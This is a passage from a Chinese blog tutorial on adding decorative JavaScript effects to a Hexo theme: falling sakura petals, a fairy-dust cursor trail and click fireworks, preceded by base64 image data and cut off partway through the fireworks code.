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&quot;;</span><br><span class="line"></span><br><span class="line">function Sakura(x, y, s, r, fn) &#123;</span><br><span class="line">    this.x = x;</span><br><span class="line">    this.y = y;</span><br><span class="line">    this.s = s;</span><br><span class="line">    this.r = r;</span><br><span class="line">    this.fn = fn;</span><br><span class="line">&#125;</span><br><span class="line">Sakura.prototype.draw = function (cxt) &#123;</span><br><span class="line">    cxt.save();</span><br><span class="line">    var xc = 40 * this.s / 4;</span><br><span class="line">    cxt.translate(this.x, this.y);</span><br><span class="line">    cxt.rotate(this.r);</span><br><span class="line">    cxt.drawImage(img, 0, 0, 40 * this.s, 40 * this.s)</span><br><span class="line">    cxt.restore();</span><br><span class="line">&#125;</span><br><span class="line">Sakura.prototype.update = function () &#123;</span><br><span class="line">    this.x = this.fn.x(this.x, this.y);</span><br><span class="line">    this.y = this.fn.y(this.y, this.y);</span><br><span class="line">    this.r = this.fn.r(this.r);</span><br><span class="line">    if (this.x &gt; window.innerWidth || this.x &lt; 0 || this.y &gt; window.innerHeight || this.y &lt; 0) &#123;</span><br><span class="line">        this.r = getRandom(&#x27;fnr&#x27;);</span><br><span class="line">        if (Math.random() &gt; 0.4) &#123;</span><br><span class="line">            this.x = getRandom(&#x27;x&#x27;);</span><br><span class="line">            this.y = 0;</span><br><span class="line">            this.s = getRandom(&#x27;s&#x27;);</span><br><span class="line">            this.r = getRandom(&#x27;r&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            this.x = window.innerWidth;</span><br><span class="line">            this.y = getRandom(&#x27;y&#x27;);</span><br><span class="line">            this.s = getRandom(&#x27;s&#x27;);</span><br><span class="line">            this.r = getRandom(&#x27;r&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">SakuraList = function () &#123;</span><br><span class="line">    this.list = [];</span><br><span class="line">&#125;</span><br><span class="line">SakuraList.prototype.push = function (sakura) &#123;</span><br><span class="line">    this.list.push(sakura);</span><br><span class="line">&#125;</span><br><span class="line">SakuraList.prototype.update = function () &#123;</span><br><span class="line">    for (var i = 0, len = this.list.length; i &lt; len; i++) &#123;</span><br><span class="line">        this.list[i].update();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">SakuraList.prototype.draw = function (cxt) &#123;</span><br><span class="line">    for (var i = 0, len = this.list.length; i &lt; len; i++) &#123;</span><br><span class="line">        this.list[i].draw(cxt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">SakuraList.prototype.get = function (i) &#123;</span><br><span class="line">    return this.list[i];</span><br><span class="line">&#125;</span><br><span class="line">SakuraList.prototype.size = function () &#123;</span><br><span class="line">    return this.list.length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getRandom(option) &#123;</span><br><span class="line">    var ret, random;</span><br><span class="line">    switch (option) &#123;</span><br><span class="line">        case &#x27;x&#x27;:</span><br><span class="line">            ret = Math.random() * window.innerWidth;</span><br><span class="line">            break;</span><br><span class="line">        case &#x27;y&#x27;:</span><br><span class="line">            ret = Math.random() * window.innerHeight;</span><br><span class="line">            break;</span><br><span class="line">        case &#x27;s&#x27;:</span><br><span class="line">            ret = Math.random();</span><br><span class="line">            break;</span><br><span class="line">        case &#x27;r&#x27;:</span><br><span class="line">            ret = Math.random() * 6;</span><br><span class="line">            break;</span><br><span class="line">        case &#x27;fnx&#x27;:</span><br><span class="line">            random = -0.5 + Math.random() * 1;</span><br><span class="line">            ret = function (x, y) &#123;</span><br><span class="line">                return x + 0.5 * random - 1.7;</span><br><span class="line">            &#125;;</span><br><span class="line">            break;</span><br><span class="line">        case &#x27;fny&#x27;:</span><br><span class="line">            random = 1.5 + Math.random() * 0.7</span><br><span class="line">            ret = function (x, y) &#123;</span><br><span class="line">                return y + random;</span><br><span class="line">            &#125;;</span><br><span class="line">            break;</span><br><span class="line">        case &#x27;fnr&#x27;:</span><br><span class="line">            random = Math.random() * 0.03;</span><br><span class="line">            ret = function (r) &#123;</span><br><span class="line">                return r + random;</span><br><span class="line">            &#125;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function startSakura() &#123;</span><br><span class="line">    requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame ||</span><br><span class="line">        window.msRequestAnimationFrame || window.oRequestAnimationFrame;</span><br><span class="line">    var canvas = document.createElement(&#x27;canvas&#x27;),</span><br><span class="line">        cxt;</span><br><span class="line">    staticx = true;</span><br><span class="line">    canvas.height = window.innerHeight;</span><br><span class="line">    canvas.width = window.innerWidth;</span><br><span class="line">    canvas.setAttribute(&#x27;style&#x27;, &#x27;position: fixed;left: 0;top: 0;pointer-events: none;&#x27;);</span><br><span class="line">    canvas.setAttribute(&#x27;id&#x27;, &#x27;canvas_sakura&#x27;);</span><br><span class="line">    document.getElementsByTagName(&#x27;body&#x27;)[0].appendChild(canvas);</span><br><span class="line">    cxt = canvas.getContext(&#x27;2d&#x27;);</span><br><span class="line">    var sakuraList = new SakuraList();</span><br><span class="line">    for (var i = 0; i &lt; 50; i++) &#123;</span><br><span class="line">        var sakura, randomX, randomY, randomS, randomR, randomFnx, randomFny;</span><br><span class="line">        randomX = getRandom(&#x27;x&#x27;);</span><br><span class="line">        randomY = getRandom(&#x27;y&#x27;);</span><br><span class="line">        randomR = getRandom(&#x27;r&#x27;);</span><br><span class="line">        randomS = getRandom(&#x27;s&#x27;);</span><br><span class="line">        randomFnx = getRandom(&#x27;fnx&#x27;);</span><br><span class="line">        randomFny = getRandom(&#x27;fny&#x27;);</span><br><span class="line">        randomFnR = getRandom(&#x27;fnr&#x27;);</span><br><span class="line">        sakura = new Sakura(randomX, randomY, randomS, randomR, &#123;</span><br><span class="line">            x: randomFnx,</span><br><span class="line">            y: randomFny,</span><br><span class="line">            r: randomFnR</span><br><span class="line">        &#125;);</span><br><span class="line">        sakura.draw(cxt);</span><br><span class="line">        sakuraList.push(sakura);</span><br><span class="line">    &#125;</span><br><span class="line">    stop = requestAnimationFrame(function () &#123;</span><br><span class="line">        cxt.clearRect(0, 0, canvas.width, canvas.height);</span><br><span class="line">        sakuraList.update();</span><br><span class="line">        sakuraList.draw(cxt);</span><br><span class="line">        stop = requestAnimationFrame(arguments.callee);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">window.onresize = function () &#123;</span><br><span class="line">    var canvasSnow = document.getElementById(&#x27;canvas_snow&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">img.onload = function () &#123;</span><br><span class="line">    startSakura();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function stopp() &#123;</span><br><span class="line">    if (staticx) &#123;</span><br><span class="line">        var child = document.getElementById(&quot;canvas_sakura&quot;);</span><br><span class="line">        child.parentNode.removeChild(child);</span><br><span class="line">        window.cancelAnimationFrame(stop);</span><br><span class="line">        staticx = false;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        startSakura();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再<code>themes/matery/layout/layout.ejs</code>文件内添加下面的内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="comment">//只在桌面版网页启用特效</span></span><br><span class="line"><span class="keyword">var</span> windowWidth = $(<span class="built_in">window</span>).width();</span><br><span class="line"><span class="keyword">if</span> (windowWidth &gt; <span class="number">768</span>) &#123;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/sakura.js&quot;&gt;&lt;\/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="添加鼠标彩虹星星掉落跟随效果"><a href="#添加鼠标彩虹星星掉落跟随效果" class="headerlink" title="添加鼠标彩虹星星掉落跟随效果"></a>添加鼠标彩虹星星掉落跟随效果</h1><p>在<code>themes/matery/source/js</code>目录下新建<code>cursor.js</code>文件，将内容复制粘贴到cursor.js即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!</span><br><span class="line"> * Fairy Dust Cursor.js</span><br><span class="line"> * - 90&#x27;s cursors collection</span><br><span class="line"> * -- https://github.com/tholman/90s-cursor-effects</span><br><span class="line"> * -- http://codepen.io/tholman/full/jWmZxZ/</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">//鼠标点击雪花特效</span><br><span class="line">(function fairyDustCursor() &#123;</span><br><span class="line">  </span><br><span class="line">  var possibleColors = [&quot;#D61C59&quot;, &quot;#E7D84B&quot;, &quot;#1B8798&quot;]</span><br><span class="line">  var width = window.innerWidth;</span><br><span class="line">  var height = window.innerHeight;</span><br><span class="line">  var cursor = &#123;x: width/2, y: width/2&#125;;</span><br><span class="line">  var particles = [];</span><br><span class="line">  </span><br><span class="line">  function init() &#123;</span><br><span class="line">    bindEvents();</span><br><span class="line">    loop();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // Bind events that are needed</span><br><span class="line">  function bindEvents() &#123;</span><br><span class="line">    document.addEventListener(&#x27;mousemove&#x27;, onMouseMove);</span><br><span class="line">    document.addEventListener(&#x27;touchmove&#x27;, onTouchMove);</span><br><span class="line">    document.addEventListener(&#x27;touchstart&#x27;, onTouchMove);</span><br><span class="line">    </span><br><span class="line">    window.addEventListener(&#x27;resize&#x27;, onWindowResize);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function onWindowResize(e) &#123;</span><br><span class="line">    width = window.innerWidth;</span><br><span class="line">    height = window.innerHeight;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function onTouchMove(e) &#123;</span><br><span class="line">    if( e.touches.length &gt; 0 ) &#123;</span><br><span class="line">      for( var i = 0; i &lt; e.touches.length; i++ ) &#123;</span><br><span class="line">        addParticle( e.touches[i].clientX, e.touches[i].clientY, possibleColors[Math.floor(Math.random()*possibleColors.length)]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function onMouseMove(e) &#123;    </span><br><span class="line">    cursor.x = e.clientX;</span><br><span class="line">    cursor.y = e.clientY;</span><br><span class="line">    </span><br><span class="line">    addParticle( cursor.x, cursor.y, possibleColors[Math.floor(Math.random()*possibleColors.length)]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addParticle(x, y, color) &#123;</span><br><span class="line">    var particle = new Particle();</span><br><span class="line">    particle.init(x, y, color);</span><br><span class="line">    particles.push(particle);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function updateParticles() &#123;</span><br><span class="line">    </span><br><span class="line">    // Updated</span><br><span class="line">    for( var i = 0; i &lt; particles.length; i++ ) &#123;</span><br><span class="line">      particles[i].update();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Remove dead particles</span><br><span class="line">    for( var i = particles.length -1; i &gt;= 0; i-- ) &#123;</span><br><span class="line">      if( particles[i].lifeSpan &lt; 0 ) &#123;</span><br><span class="line">        particles[i].die();</span><br><span class="line">        particles.splice(i, 1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function loop() &#123;</span><br><span class="line">    requestAnimationFrame(loop);</span><br><span class="line">    updateParticles();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  /**</span><br><span class="line">   * Particles</span><br><span class="line">   */</span><br><span class="line">  </span><br><span class="line">  function Particle() &#123;</span><br><span class="line"></span><br><span class="line">    this.character = &quot;*&quot;;</span><br><span class="line">    this.lifeSpan = 120; //ms</span><br><span class="line">    this.initialStyles =&#123;</span><br><span class="line">      &quot;position&quot;: &quot;fixed&quot;,</span><br><span class="line">      &quot;top&quot;: &quot;0&quot;, //必须加</span><br><span class="line">      &quot;display&quot;: &quot;block&quot;,</span><br><span class="line">      &quot;pointerEvents&quot;: &quot;none&quot;,</span><br><span class="line">      &quot;z-index&quot;: &quot;10000000&quot;,</span><br><span class="line">      &quot;fontSize&quot;: &quot;20px&quot;,</span><br><span class="line">      &quot;will-change&quot;: &quot;transform&quot;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Init, and set properties</span><br><span class="line">    this.init = function(x, y, color) &#123;</span><br><span class="line"></span><br><span class="line">      this.velocity = &#123;</span><br><span class="line">        x:  (Math.random() &lt; 0.5 ? -1 : 1) * (Math.random() / 2),</span><br><span class="line">        y: 1</span><br><span class="line">      &#125;;</span><br><span class="line">      </span><br><span class="line">      this.position = &#123;x: x - 10, y: y - 20&#125;;</span><br><span class="line">      this.initialStyles.color = color;</span><br><span class="line">      console.log(color);</span><br><span class="line"></span><br><span class="line">      this.element = document.createElement(&#x27;span&#x27;);</span><br><span class="line">      this.element.innerHTML = this.character;</span><br><span class="line">      applyProperties(this.element, this.initialStyles);</span><br><span class="line">      this.update();</span><br><span class="line">      </span><br><span class="line">      document.body.appendChild(this.element);</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    this.update = function() &#123;</span><br><span class="line">      this.position.x += this.velocity.x;</span><br><span class="line">      this.position.y += this.velocity.y;</span><br><span class="line">      this.lifeSpan--;</span><br><span class="line">      </span><br><span class="line">      this.element.style.transform = &quot;translate3d(&quot; + this.position.x + &quot;px,&quot; + this.position.y + &quot;px,0) scale(&quot; + (this.lifeSpan / 120) + &quot;)&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    this.die = function() &#123;</span><br><span class="line">      this.element.parentNode.removeChild(this.element);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  /**</span><br><span class="line">   * Utils</span><br><span class="line">   */</span><br><span class="line">  </span><br><span class="line">  // Applies css `properties` to an element.</span><br><span class="line">  function applyProperties( target, properties ) &#123;</span><br><span class="line">    for( var key in properties ) &#123;</span><br><span class="line">      target.style[ key ] = properties[ key ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  init();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>然后再<code>themes/matery/layout/layout.ejs</code>文件内添加下面的内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/js/cursor.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="点击爆炸效果"><a href="#点击爆炸效果" class="headerlink" title="点击爆炸效果"></a>点击爆炸效果</h1><p>首先在<code>themes/next/source/js/src</code>里面建一个叫fireworks.js的文件，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line"></span><br><span class="line">function updateCoords(e) &#123;</span><br><span class="line">    pointerX = (e.clientX || e.touches[0].clientX) - canvasEl.getBoundingClientRect().left, pointerY = e.clientY || e.touches[</span><br><span class="line">        0].clientY - canvasEl.getBoundingClientRect().top</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setParticuleDirection(e) &#123;</span><br><span class="line">    var t = anime.random(0, 360) * Math.PI / 180,</span><br><span class="line">        a = anime.random(50, 180),</span><br><span class="line">        n = [-1, 1][anime.random(0, 1)] * a;</span><br><span class="line">    return &#123;</span><br><span class="line">        x: e.x + n * Math.cos(t),</span><br><span class="line">        y: e.y + n * Math.sin(t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function createParticule(e, t) &#123;</span><br><span class="line">    var a = &#123;&#125;;</span><br><span class="line">    return a.x = e, a.y = t, a.color = colors[anime.random(0, colors.length - 1)], a.radius = anime.random(16, 32), a.endPos =</span><br><span class="line">        setParticuleDirection(a), a.draw = function () &#123;</span><br><span class="line">            ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.fillStyle = a.color, ctx.fill()</span><br><span class="line">        &#125;, a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function createCircle(e, t) &#123;</span><br><span class="line">    var a = &#123;&#125;;</span><br><span class="line">    return a.x = e, a.y = t, a.color = &quot;#F00&quot;, a.radius = 0.1, a.alpha = 0.5, a.lineWidth = 6, a.draw = function () &#123;</span><br><span class="line">        ctx.globalAlpha = a.alpha, ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.lineWidth =</span><br><span class="line">            a.lineWidth, ctx.strokeStyle = a.color, ctx.stroke(), ctx.globalAlpha = 1</span><br><span class="line">    &#125;, a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function renderParticule(e) &#123;</span><br><span class="line">    for (var t = 0; t &lt; e.animatables.length; t++) &#123;</span><br><span class="line">        e.animatables[t].target.draw()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function animateParticules(e, t) &#123;</span><br><span class="line">    for (var a = createCircle(e, t), n = [], i = 0; i &lt; numberOfParticules; i++) &#123;</span><br><span class="line">        n.push(createParticule(e, t))</span><br><span class="line">    &#125;</span><br><span class="line">    anime.timeline().add(&#123;</span><br><span class="line">        targets: n,</span><br><span class="line">        x: function (e) &#123;</span><br><span class="line">            return e.endPos.x</span><br><span class="line">        &#125;,</span><br><span class="line">        y: function (e) &#123;</span><br><span class="line">            return e.endPos.y</span><br><span class="line">        &#125;,</span><br><span class="line">        radius: 0.1,</span><br><span class="line">        duration: anime.random(1200, 1800),</span><br><span class="line">        easing: &quot;easeOutExpo&quot;,</span><br><span class="line">        update: renderParticule</span><br><span class="line">    &#125;).add(&#123;</span><br><span class="line">        targets: a,</span><br><span class="line">        